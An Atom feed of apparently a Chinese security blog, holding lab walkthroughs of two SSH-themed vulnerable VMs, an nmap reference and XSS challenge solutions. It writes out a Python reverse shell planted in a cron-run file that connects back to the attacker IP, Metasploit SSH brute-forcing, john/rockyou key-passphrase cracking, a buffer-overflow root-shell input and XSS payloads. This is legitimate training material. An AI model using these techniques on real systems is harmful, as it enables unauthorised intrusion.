@@ -1,0 +1,2982 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://M0kY4n.github.io111</id>
+    <title>MokYan</title>
+    <updated>2021-07-02T11:37:25.027Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://M0kY4n.github.io111"/>
+    <link rel="self" href="https://M0kY4n.github.io111/atom.xml"/>
+    <subtitle>The more you know, the more you don&apos;t know</subtitle>
+    <logo>https://M0kY4n.github.io111/images/avatar.png</logo>
+    <icon>https://M0kY4n.github.io111/favicon.ico</icon>
+    <rights>All rights reserved 2021, MokYan</rights>
+    <entry>
+        <title type="html"><![CDATA[SSH-私钥泄露]]></title>
+        <id>https://M0kY4n.github.io111/post/ssh-si-yao-xie-lu/</id>
+        <link href="https://M0kY4n.github.io111/post/ssh-si-yao-xie-lu/">
+        </link>
+        <updated>2021-05-19T15:21:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x00-环境配置">0x00 环境配置</h2>
+<ol>
+<li>SSH-私钥泄露靶机</li>
+<li>Kali 攻击机</li>
+<li>靶机与攻击机处于同一网段</li>
+</ol>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<ol>
+<li>
+<p>寻找靶机IP</p>
+<p>可以使用<code>netdiscover</code>或者 <code>nmap</code>进行IP扫描</p>
+<pre><code class="language-shell">netdiscover 10.112.132.0/24
+nmap 10.112.132.0/24
+</code></pre>
+</li>
+<li>
+<p>扫描服务</p>
+<p>因为是使用了nmap进行了扫描IP , 所以顺便把服务也一起扫描了</p>
+<pre><code class="language-shell">nmap -A -T4 10.112.132.16
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/nmap.jpg?raw=true" alt="nmap.jpg" loading="lazy"></figure>
+</li>
+<li>
+<p>目录扫描</p>
+<p>从nmap扫描结果得知 , 一共存在3个端口 22(SSH) , 80(HTTP) , 31337(ELIET) , 在nmap 综合扫描选项扫描靶机 , 能发现 31337也是运行Http服务 , 对两个Http服务的端口进行目录扫描 , 80结果为空 , 31337结果发现<code>.ssh</code>文件夹</p>
+<figure data-type="image" tabindex="2"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/dirsearch.jpg?raw=true" alt="dirsearch" loading="lazy"></figure>
+<p>robots.txt 有个/taxes目录 , 访问得到一个Flag</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/robots.txt.jpg?raw=true" alt="robots.txt" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag1.jpg?raw=true" alt="Flag1" loading="lazy"></figure>
+<p>访问<code>.ssh</code>下载三个文件</p>
+<p>​	a.	authorized_keys - 公钥</p>
+<p>​	b.	id_rsa - 私钥</p>
+<p>​	c.	id_rsa.pub - 私钥证书</p>
+</li>
+</ol>
+<h2 id="0x02-ssh连接">0x02 SSH连接</h2>
+<p>关于SSH的一些知识-转自<code>TelCruel</code> <a href="https://telcruel.gitee.io/2019/09/21/SSH/">传送门</a></p>
+<ol>
+<li>
+<p>公钥</p>
+<p>查看公钥发现用户名为<code>simon</code></p>
+<figure data-type="image" tabindex="5"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/autorized_key.jpg?raw=true" alt="autorized_keys" loading="lazy"></figure>
+</li>
+<li>
+<p>私钥</p>
+<p>尝试使用公钥登录 , 提示没权限</p>
+<pre><code class="language-shell">ssh -i id_rsa simon@10.112.132.16
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Permission_Denied.jpg?raw=true" alt="Permission_Denied" loading="lazy"></figure>
+<p>​</p>
+<p>修改权限 , 再次尝试登录 , 提示需要密码</p>
+<pre><code class="language-shell">chmod 600 id_rsa
+ssh -i id_rsa simon@10.112.132.16
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login_not_password.jpg?raw=true" alt="SSH_login_not_password" loading="lazy"></figure>
+<p>​</p>
+</li>
+<li>
+<p>破解私钥</p>
+<p>使用<code>ssh2john</code>对 id_rsa 秘钥信息转为 John可以识别的信息 , 让使用zcat 破解isacrack 信息</p>
+<pre><code class="language-shell">/usr/share/john/ssh2john.py id_rsa &gt; isacrack
+zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Zcat&amp;Join.jpg?raw=true" alt="Zcat&amp;Join" loading="lazy"></figure>
+<p>破解出密码为: <code>starwars</code> , 再次登录</p>
+<figure data-type="image" tabindex="9"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login.jpg?raw=true" alt="SSH_login" loading="lazy"></figure>
+</li>
+<li>
+<p>信息收集</p>
+<p>在root 目录下 有个 <code>flag.txt</code>与 'read_message.c'  , flag.txt没权限打开 , read_message.c查看发现第二个flag  , 且提示我们需要执行这个源码</p>
+<figure data-type="image" tabindex="10"><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag2.jpg?raw=true" alt="Flag2" loading="lazy"></figure>
+<p>查找已经编译的程序,并执行</p>
+<pre><code class="language-shel">find / -name &quot;*read_message*&quot; 2&gt;/dev/null
+</code></pre>
+</li>
+</ol>
+<h2 id="0x03-提权">0x03 提权</h2>
+<p>​	这个程序是一个简单的溢出攻击(然而我不会 (汗颜)),直接照搬<code>TelCruel</code>的WP了</p>
+<pre><code> 这里因为gets（buf）没有限制读取的长度，但是buf[]这个数组只能储存20个字符，那么超过20个字符的就会存入缓冲区，将后面的内容覆盖。然后当执行到execve的时候原来要执行program[]内的字符，被覆盖后就可以利用了。所以只要输入SimonAAAAAAAAAAAAAAA/bin/sh,即可进入root的shell
+</code></pre>
+<p>​	执行后 , 权限提升至root , 查看flag.txt 得到 第三个Flag</p>
+<p>​	<img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/flag3.jpg?raw=true" alt="Flag3" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SSH-服务渗透root主机]]></title>
+        <id>https://M0kY4n.github.io111/post/ssh-fu-wu-shen-tou-root-zhu-ji/</id>
+        <link href="https://M0kY4n.github.io111/post/ssh-fu-wu-shen-tou-root-zhu-ji/">
+        </link>
+        <updated>2021-04-01T12:14:06.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="0x00-环境配置">0x00 环境配置</h2>
+<ol>
+<li>SSH-服务渗透root主机靶机</li>
+<li>Kali 攻击机</li>
+<li>靶机与攻击机处于同一网段</li>
+</ol>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<ol>
+<li>
+<p>寻找靶机IP</p>
+<p>由于Kali与靶机在统一网段 , 所以直接扫Kali IP所在的网段 , 使用netdiscover进行扫描</p>
+<pre><code class="language-shell">netdiscover 10.112.132.0/24
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/netdiscover.jpg" alt="netdiscover" loading="lazy"></figure>
+</li>
+<li>
+<p>扫描靶机服务</p>
+<p>得知靶机的IP后 , 使用nmap进行服务扫描 , <a href="https://mokyan.github.io/post/nmap-xue-xi-shou-ce/">nmap学习手册</a>传送门</p>
+<pre><code class="language-shell">nmap -A -T4 10.112.132.18
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-nmap-A.jpg" alt="nmap-A" loading="lazy"></figure>
+</li>
+</ol>
+<p>3.访问端口服务</p>
+<p>​	从扫描结果中发现80端口 , 访问80端口 , 通过wappalyzer , 确定是一个静态HTML页面 , 中间件为Apache , 系统为Debian , 页面有几个 人名 与 邮箱</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/about-Us.jpg" alt="人名与邮箱" loading="lazy"></p>
+<p>​	通过nmap扫描结果和robots.txt内容 , 得到<code>/wordpress-blog</code>和<code>/files</code>两个目录 , 一个为空 , 一个访问得到 <code>YOU JUST GOT TROLLED</code> 淦...</p>
+<p>​	继续深度查找 , 进行目录爆破 , 使用 <code>dirsearch</code>进行目录爆破 <a href="https://github.com/maurosoria/dirsearch">dirsearch传送门</a></p>
+<pre><code class="language-shell">python3 dirsearch.py -u http://10.112.132.18 
+</code></pre>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dirsearch.jpg" alt="dirsearch" loading="lazy"></p>
+<p>​	dirsearch 扫描结果发现一个名为 <code>icons</code> 的目录 , 访问目录 , 发现一个奇怪的txt文件 , 打开竟是一个SSH的密钥文件</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/txtfile.jpg" alt="txtfile" loading="lazy"></p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Key.jpg" alt="SSH-KEY" loading="lazy"></p>
+<p>​	得到SSH密钥 , 结合之前拿到的人名和邮箱 , 尝试进行SSH登录</p>
+<h2 id="0x02-ssh登录">0x02 SSH登录</h2>
+<pre><code class="language-shell">ssh -i Key_File Username@Host
+</code></pre>
+<p>使用人名登录 , 只有 martin 是可以登录 , 且密码为空 , 回车就能直接进去 !</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Login.jpg" alt="SSH-Login" loading="lazy"></figure>
+<p>查看了权限 , 不是root的 , 需要提权 , <a href="https://zhuanlan.zhihu.com/p/341658060">linux提权常用方式</a></p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-id.jpg" alt="SSH-id" loading="lazy"></figure>
+<p>查看计划任务 , 发现 <strong>jimmy</strong> 创建了一个每5分钟就执行一次的Python文件 <strong>sekurity.py</strong> 的计划任务</p>
+<pre><code class="language-shell">cat /etc/crontab
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/crontab.jpg" alt="crontab" loading="lazy"></figure>
+<p>查看这个Python文件 , 发现不存在 ! 可以向此处进行反弹shell , 查看是否具有更高的权限</p>
+<pre><code class="language-shell">martin@debian:~$ cat /tmp/sekurity.py
+cat: /tmp/sekurity.py: Aucun fichier ou dossier de ce type
+martin@debian:~$ 
+
+</code></pre>
+<p>创建sekurity.py文件 , 编写脚本</p>
+<pre><code class="language-shell">#创建脚本
+vi /tmp/sekurity.py
+
+#编辑脚本
+#!/usr/bin/python
+import os,socket,subprocess
+s=socket.socket()
+s.connect((&quot;10.112.132.16&quot;,25565)   #攻击机IP，攻击机监听端口（任意空闲端口）
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+
+# ESC -&gt; 冒号 -&gt; wq 保存退出
+# 添加执行权限
+chmod +x /tmp/sekurity.py
+</code></pre>
+<p>在攻击机上面开启监听 , 每5分钟执行一次 , 耐心等待</p>
+<pre><code class="language-shell">nc -lvp 25565
+</code></pre>
+<p>连接成功 , 用户<strong>jimmy</strong>依旧不是 root权限</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/shell-id.jpg" alt="shell-id" loading="lazy"></figure>
+<h2 id="0x03-ssh爆破">0x03 SSH爆破</h2>
+<p>没办法,只能爆破最后一个用户 <strong>hadi</strong> , 使用品轩字典创建一个字典 , 在网上已经有人跑出来密码为 &quot;hadi123&quot; , 所以我们创建范围 hadi100-hadi199 , 主要介绍爆破方法 !</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/create-dist.jpg" alt="create-dist" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dist.jpg" alt="dist" loading="lazy"></figure>
+<p>使用 <strong>msfconsole</strong> , 进行SSH爆破</p>
+<pre><code class="language-shell">msfconsole
+
+search ssh	#搜索ssh爆破的脚本
+#auxiliary/scanner/ssh/ssh_login 这个就是ssh登录爆破的脚本
+
+use auxiliary/scanner/ssh/ssh_login		#使用脚本
+show options	#显示选项
+
+set rhosts 10.112.132.19	#设置靶机ip
+set username hadi	#设置用户名	
+set pass_file /home/mokyan/桌面/password.txt	#设置密码
+set threads 10	#设置线程
+set verbose true	#设置输出详细信息
+
+#设置完毕 , run运行
+run
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-options.jpg" alt="msfconsole-options" loading="lazy"></figure>
+<p>爆破成功 , 提示一个会话打开</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-run.jpg" alt="msfconsole-run" loading="lazy"></figure>
+<p>打开会话,并优化shell</p>
+<pre><code class="language-shell">session -i 1
+
+python -c &quot;import pty; pty.spawn('/bin/bash')&quot;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-shell.jpg" alt="msfconsole-shell" loading="lazy"></figure>
+<p>使用su 切换root , 密码经过尝试为hadi123 , 在root目录下找到 flag.txt</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/flag.jpg" alt="flag" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Nmap 学习手册]]></title>
+        <id>https://M0kY4n.github.io111/post/nmap-xue-xi-shou-ce/</id>
+        <link href="https://M0kY4n.github.io111/post/nmap-xue-xi-shou-ce/">
+        </link>
+        <updated>2021-03-12T13:19:54.000Z</updated>
+        <content type="html"><![CDATA[<p>nmap学习手册</p>
+<h1 id="nmap-描述">nmap 描述</h1>
+<p>​		Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。 —— 来自<a href="https://nmap.org/man/zh/index.html">nmap官网</a></p>
+<br>
+<br>
+<h1 id="nmap语法">nmap语法</h1>
+<pre><code class="language-shell">nmap [扫描类型&amp;选项] (目标)
+</code></pre>
+<br>
+<br>
+<h1 id="nmap目标">nmap目标</h1>
+<p>nmap的目标可以传递<strong>主机名 , IP地址 , 网段</strong>等</p>
+<br>
+<br>
+<h1 id="nmap扫描类型选项">nmap扫描类型&amp;选项</h1>
+<h2 id="快速扫描">快速扫描</h2>
+<p>nmap 192.168.50.148</p>
+<p>nmap会发送一个ping包 , 来检测目标主机上以开放的端口(范围暂不清楚) , 不推荐此方法检测,因为结果比较模糊</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-scan.jpg" alt="nmap 扫描" loading="lazy"></figure>
+<br>
+<h2 id="主机发现">主机发现</h2>
+<h3 id="-sl-列表发现">-sL : 列表发现</h3>
+<p>​	仅对发现主机列出来,不进行任何扫描</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sL.jpg" alt="nmap -sL扫描" loading="lazy"></figure>
+<h3 id="-sp-ping扫描">-sP : Ping扫描</h3>
+<p>​	只确定是否在线,不进行更深一步扫描</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sP.jpg" alt="nmap -sP扫描" loading="lazy"></figure>
+<br>
+<h2 id="扫描技巧">扫描技巧</h2>
+<h3 id="-ss-半开放扫描">-sS : 半开放扫描</h3>
+<p>​	使用频率比较高的扫描类型 , <a href="https://baike.baidu.com/item/SYN/8880122?fr=aladdin">SYN</a>扫描 , 又称为半开放扫描 , 它不需要建立一个完整<a href="https://baike.baidu.com/item/TCP/33012?fr=aladdin">TCP</a>连接(建立一次TCP需要进行三次握手 , 而第一次握手则是发送SYN报文),因此 TCP SYN Scan(sS) 被称为半开放扫描</p>
+<ul>
+<li>
+<p>优点 : nmap 发送 SYN包到目标是不会产生任何会话 , 目标主机几乎不会把连接记入系统日志(并非一定 ! ! ! , 能有效阻止目标判断为扫描攻击) , 扫描速度快 , 效率高 , 在工作中使用频率较高</p>
+</li>
+<li>
+<p>缺点 : 执行命令需要系统最高权限,即 root 或者 Administrator 权限</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sS.jpg" alt="nmap -sS扫描" loading="lazy"></figure>
+</li>
+</ul>
+<h3 id="-st-tcp扫描">-sT : TCP扫描</h3>
+<p>​	TCP connect() Scan (sT) , 相对于TCP SYN Scan , TCP connect() Scan 是默认的扫描模式,使用TCP connect()扫描需要调用系统的connect()</p>
+<ul>
+<li>
+<p>优点 : 执行命令无需系统最高权限 , 普通用户亦可执行命令</p>
+</li>
+<li>
+<p>缺点 : 由于扫描会产生会话 , 所以目标主机会记录大量的连接请求记入系统日志 , 并且若有防护程序则会识别出扫描攻击 , 因为要进行三次握手 , 所以速度较慢 , 效率较低</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sT.jpg" alt="nmap -sT扫描" loading="lazy"></figure>
+</li>
+</ul>
+<h3 id="-su-udp扫描">-sU : UDP扫描</h3>
+<p>​	<a href="https://baike.baidu.com/item/UDP/571511">UDP</a> Scan(sU) 相对于 SYN扫描和TCP扫描 , UDP扫描无需进行三次握手和发送SYN包 , 因为 UDP Scan是针对UDP端口扫描的,只需发送UDP数据包到目标 , 然后等待响应即可</p>
+<p>​	如果返回是ICMP的错误信息 , 这说明端口是关闭的 , 若返回是正确的回应 , 则说明端口是开放的 , UDP扫描速度会很慢 , 比TCP扫描慢😓</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sU.jpg" alt="nmap -sU扫描" loading="lazy"></p>
+<h3 id="-sf-fin扫描">-sF : FIN扫描</h3>
+<p>​	FIN扫描也是TCP的一种扫描 , 发送一个FIN标志的数据包 , 有时候目标主机可能存在IDS和IPS系统,会阻止掉SYN数据包 , 因此FIN标志的数据包一般不会阻止 , 而且FIN标志的数据包也是无需进行TCP的三次握手 , 因此FIN扫描也是大概率不会被目标把连接记入系统日志 , 扫描的信息相对较少</p>
+<p>​	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sF.jpg" alt="nmap -sF扫描" loading="lazy"></p>
+<h3 id="-sf-sx-sn-原理类似">-sF -sX -sN : 原理类似</h3>
+<p>​	原理大致相同 -sF 是 发送FIN数据包扫描 -sX 是 圣诞树(XmasTree)扫描 -sN是 空(NULL)扫描</p>
+<p>​	有的防火墙可能会阻止 -sS扫描 , 使用这些扫描类型可以绕过阻止进行扫描 , 他们也是没有进行TCP三次握手 , 目标主机大概率不会被目标把连接记入系统日志,且扫描速度比 -sT 块</p>
+<ul>
+<li>优点 : 能躲过一些无状态防火墙和报文过滤路由器，比SYN还要隐秘</li>
+<li>缺点 : 现代的IDS产品可以发现，并非所有的系统严格遵循<a href="https://harttle.land/2014/09/27/tcp.html">RFC 793</a></li>
+</ul>
+<br>
+<h2 id="服务版本识别">服务版本识别</h2>
+<h3 id="-sv-version版本扫描检测">-sV : Version版本扫描检测</h3>
+<p>​	Version 版本检测是用来扫描目标主机上的端口服务版本 , 不过此扫描选项不能用来扫描目标开放端口 , 因此使用此选项之前 , 请使用TCPSYN进行端口开放扫描</p>
+<ul>
+<li>
+<p>--version-intensity &quot;Level&quot; : 设置版本扫描强度 , Level范围为0~9 默认为7</p>
+</li>
+<li>
+<p>--version-light : 轻量级扫描 , 即 --version-intensity 2</p>
+</li>
+<li>
+<p>--version-all : 重度扫描 : 即 --version-intensity 9</p>
+</li>
+<li>
+<p>version-trace : 显示详细的扫描过程 ()</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sV.jpg" alt="nmap -sV扫描" loading="lazy"></figure>
+</li>
+</ul>
+<br>
+<h2 id="操作系统识别">操作系统识别</h2>
+<h3 id="-o-os操作系统扫描检测">-O : OS操作系统扫描检测</h3>
+<p>OS操作系统扫描检测 , 可以远程轿车操作系统信息 , 这些信息是十分有用的 , 通过获取的信息可以知道已知的漏洞</p>
+<ul>
+<li>--osscan-guess : 猜测匹配操作系统</li>
+<li>--osscan-limit : 针对指定的目标进行系统检测</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-O.jpg" alt="nmap -O扫描" loading="lazy"></figure>
+<br>
+<h2 id="脚本扫描">脚本扫描</h2>
+<pre><code class="language-shell">nmap --script 具体的脚本 目标
+</code></pre>
+<p>nmap官方脚本文档 : https://nmap.org/nsedoc/</p>
+<p>左侧列出了脚本的分类，点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。14大分类具体对应为</p>
+<ul>
+<li><a href="https://nmap.org/nsedoc/categories/auth.html">auth</a> : 负责处理鉴权证书的脚本</li>
+<li><a href="https://nmap.org/nsedoc/categories/broadcast.html">broadcast</a> : 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务</li>
+<li><a href="https://nmap.org/nsedoc/categories/brute.html">brute</a> : 提供暴力破解方式，针对常见的应用如http/snmp等</li>
+<li><a href="https://nmap.org/nsedoc/categories/default.html">default</a> : 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</li>
+<li><a href="https://nmap.org/nsedoc/categories/discovery.html">discovery</a> : 对网络进行更多的信息，如SMB枚举、SNMP查询等</li>
+<li><a href="https://nmap.org/nsedoc/categories/dos.html">dos</a> : 用于进行拒绝服务攻击</li>
+<li><a href="https://nmap.org/nsedoc/categories/exploit.html">exploit</a> : 利用已知的漏洞入侵系统</li>
+<li><a href="https://nmap.org/nsedoc/categories/external.html">external</a> : 利用第三方的数据库或资源，例如进行whois解析</li>
+<li><a href="https://nmap.org/nsedoc/categories/fuzzer.html">fuzzer</a> : 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</li>
+<li><a href="https://nmap.org/nsedoc/categories/intrusive.html">intrusive</a> : 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li>
+<li><a href="https://nmap.org/nsedoc/categories/malware.html">malware</a> : 探测目标机是否感染了病毒、开启了后门等信息</li>
+<li><a href="https://nmap.org/nsedoc/categories/safe.html">safe</a> : 此类与intrusive相反，属于安全性脚本</li>
+<li><a href="https://nmap.org/nsedoc/categories/version.html">version</a> : 负责增强服务与版本扫描（Version Detection）功能的脚本</li>
+<li><a href="https://nmap.org/nsedoc/categories/vuln.html">vuln</a> : 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</li>
+</ul>
+<h3 id="对ssh进行暴力破解">对SSH进行暴力破解</h3>
+<p>账号密码不是弱口令,所以结果是跑不出来🤣</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sC.jpg" alt="nmap -sC-SSH" loading="lazy"></figure>
+<br>
+<h2 id="时间模板">时间模板</h2>
+<h3 id="-t0-5-设置时间模板">-T&lt;0-5&gt; 设置时间模板</h3>
+<pre><code class="language-shell">nmap -sS -T&lt;0-5&gt; 192.168.1.148
+</code></pre>
+<p>优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有<code>paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</code></p>
+<ul>
+<li>paranoid、sneaky模式用于IDS躲避</li>
+<li>Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。</li>
+<li>Normal为默认模式，因此-T3 实际上是未做任何优化。</li>
+<li>Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描.</li>
+<li>nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-T.jpg" alt="nmap -T" loading="lazy"></figure>
+<h2 id="其他选项">其他选项</h2>
+<h3 id="-a-综合扫描">-A 综合扫描</h3>
+<p>此选项包含了 1-10000端口ping扫描 , 操作系统扫描 , 脚本扫描 , 路由追踪 , 服务探测</p>
+<pre><code class="language-shell">nmap -A 192.168.50.148
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-A.jpg" alt="nmap -A" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XSS弹窗练习 : http://test.xss.tv]]></title>
+        <id>https://M0kY4n.github.io111/post/testxsstv/</id>
+        <link href="https://M0kY4n.github.io111/post/testxsstv/">
+        </link>
+        <updated>2021-01-07T11:05:33.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="xss弹窗闯关练习">XSS弹窗闯关练习</h1>
+<br>
+<h2 id="前言">前言</h2>
+<p>靶机源码与 <a href="http://test.xss.tv">http://test.xss.tv</a> 的题目是一样的,并且删除了后面几道已经失效的Flash XSS题目,本文连接来自<a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-41">@国光</a>博客下《XSS从零开始》文章的连接</p>
+<blockquote>
+<p>项目地址: https://github.com/sqlsec/xssgame</p>
+</blockquote>
+<br>
+<br>
+<h2 id="0x00-先热个身吧">0x00 先热个身吧</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户:&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+</code></pre>
+<p>没有对$str进行任何过滤,echo 直接执行了JS代码</p>
+<pre><code class="language-html">payload:
+?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x01-窒息的操作">0x01 窒息的操作</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<p>双引号闭合文本框的value,插入JS代码</p>
+<pre><code class="language-html">payload:
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<br>
+<br>
+<h2 id="0x02-这该咋办啊">0x02 这该咋办啊</h2>
+<pre><code class="language-php">&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<p>单引号引号闭合文本框的value,插入JS DOM事件代码</p>
+<pre><code class="language-html">payload:
+' onclick=alert(1) //
+</code></pre>
+<br>
